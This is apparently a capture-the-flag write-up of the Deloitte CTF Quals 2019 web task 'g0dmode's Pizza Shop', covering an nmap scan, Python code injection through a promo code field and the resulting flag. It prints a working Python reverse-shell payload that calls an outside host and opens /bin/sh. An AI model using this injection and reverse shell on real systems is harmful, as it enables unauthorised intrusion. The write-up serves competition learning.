---
title: Deloitte CTF Quals 2019: g0dmode's Pizza Shop 🍕
slug: deloitte-godmod-pizza
date: 06/11/2019
---

*g0dmode's Pizza Shop* 🍕 was a task labelled web and worth 300 points. It is
a standard Python command injection. I felt like it was worth way too much
points for the difficulty.

![Task Description](/assets/pizza-god/intro.png)

As always, quick nmap scan:

```
$ nmap 3.9.188.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 15:57 GMT
Nmap scan report for ec2-3-9-188-161.eu-west-2.compute.amazonaws.com (3.9.188.161)
  Host is up (0.0037s latency).
  Not shown: 990 closed ports
  PORT     STATE    SERVICE
  22/tcp   open     ssh
  25/tcp   filtered smtp
  53/tcp   filtered domain
  80/tcp   open     http
  135/tcp  filtered msrpc
  139/tcp  filtered netbios-ssn
  445/tcp  filtered microsoft-ds
  2000/tcp open     cisco-sccp
  5060/tcp open     sip
  8008/tcp open     http

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```

We have a web application on port 80:

![Web Application](/assets/pizza-god/web_app.png)

The challenge description makes it clear that we have to inject some command
into the promo code field of the order page. We can totally ignore the
account mechanism.

![Order Page](/assets/pizza-god/order.png)

Let's try with a very simple payload: a single quote `'`. We get back an error:

![Order Page](/assets/pizza-god/crash.png)

The error looks like a Python quote parsing issue. My guess is that the backend
looks something like:

```
promo_code = ord('<USER_INPUT>')
```

If my guess is correct, the payload `') #` should produce no error, as we just
complete the function call and transform the end of the line into a comment
like so:

```python
promo_code = ord('') #')
```

My guess turned to be correct. So I decided to inject some reverse shell
payload. A friend told me to take a look at
[this website](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Let's tweak their Python payload a little bit:

```python
'); import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("geographer.fr",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); #
```

We get a root shell immediately:

![Root shell](/assets/pizza-god/root.png)

Final flag: `dctf{python_code_injection_via_unsafe_exec_call_oops1e}`.